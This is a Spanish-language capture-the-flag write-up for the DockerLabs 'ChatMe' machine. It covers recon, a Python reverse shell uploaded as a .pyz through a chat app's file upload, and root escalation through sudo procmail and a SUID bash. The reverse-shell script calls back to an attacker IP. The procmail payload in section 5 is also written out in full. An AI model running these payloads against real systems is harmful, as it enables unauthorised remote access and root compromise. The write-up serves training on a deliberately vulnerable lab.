# ChatMe — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** DockerLabs  
**Fecha de creación:** 2024  
**Técnicas:** Gobuster · WhatsApp Exploit Simulation · File Upload · Reverse Shell · procmail sudo abuse · SUID abuse

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
3. [Explotación del chat — Reverse Shell](#3-explotación-del-chat--reverse-shell)
4. [Acceso inicial](#4-acceso-inicial)
5. [Escalada de privilegios — procmail](#5-escalada-de-privilegios--procmail)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh chatme.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
80/tcp open http
```

Explorando la página principal encontramos un dominio:

```text
chat.chatme.dl
```

Lo añadimos a `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

```text
172.17.0.2 chat.chatme.dl
```

---

## 2. Enumeración web — Gobuster

Enumeramos directorios:

```bash
gobuster dir -u http://chat.chatme.dl \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Inicialmente obtenemos un error relacionado con la longitud de respuesta.

Repetimos el escaneo excluyendo la longitud detectada:

```bash
gobuster dir -u http://chat.chatme.dl \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x py,txt,php,html \
-t 100 \
--exclude-length 1891
```

Resultado:

```text
/uploads
/index.php
/chat.php
/upload.php
/css
/js
```

Accedemos a la aplicación web y observamos una simulación de chat estilo WhatsApp.

---

## 3. Explotación del chat — Reverse Shell

Investigando vulnerabilidades relacionadas con el sistema de subida de archivos encontramos una técnica basada en carga de archivos maliciosos.

Creamos un script Python para reverse shell:

```python
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.26", 443))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(["/bin/sh", "-i"])
```

Generamos el paquete:

```bash
python -m zipapp shell.py -o shell.pyz
```

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Subimos el archivo malicioso al chat:

```text
shell.pyz
```

Tras aproximadamente un minuto obtenemos una conexión remota.

---

## 4. Acceso inicial

Verificamos acceso:

```bash
whoami
system
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(ALL : ALL) NOPASSWD: /usr/bin/procmail
```

Investigamos el funcionamiento de `procmail`.

La herramienta utiliza un fichero de configuración:

```text
.procmailrc
```

Buscamos si existe:

```bash
find / -name .procmailrc 2>/dev/null
```

No encontramos ninguno, por lo que podemos crearlo manualmente.

---

## 5. Escalada de privilegios — procmail

Creamos el archivo `.procmailrc`:

```bash
nano .procmailrc
```

Contenido inicial:

```bash
TMPFILE="/tmp/pwned"

:0

| touch $TMPFILE
```

Ejecutamos `procmail`:

```bash
echo 'test' | sudo /usr/bin/procmail -m .procmailrc
```

Comprobamos resultado:

```bash
ls -la /tmp/pwned
```

El archivo pertenece a `root`, confirmando ejecución privilegiada.

Ahora modificamos el payload:

```bash
TMPFILE="/tmp/pwned"

:0

| touch $TMPFILE; chmod u+s /bin/bash
```

Ejecutamos nuevamente:

```bash
echo 'test' | sudo /usr/bin/procmail -m .procmailrc
```

Verificamos permisos:

```bash
ls -la /bin/bash
```

Resultado:

```text
-rwsr-xr-x
```

Ejecutamos Bash preservando privilegios:

```bash
bash -p
```

Verificamos acceso:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Subida insegura de archivos | Ejecución remota de código |
| Reverse Shell Python | Acceso interactivo |
| Servicio de chat vulnerable | Compromiso del sistema |
| procmail ejecutable con sudo | Escalada de privilegios |
| Activación del bit SUID sobre bash | Acceso persistente root |

**Para defenderse:**

- Validar correctamente archivos subidos.
- Restringir ejecución de contenido arbitrario.
- Limitar permisos sudo innecesarios.
- Auditar herramientas de procesamiento de correo.
- Monitorizar cambios en binarios críticos como `/bin/bash`.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
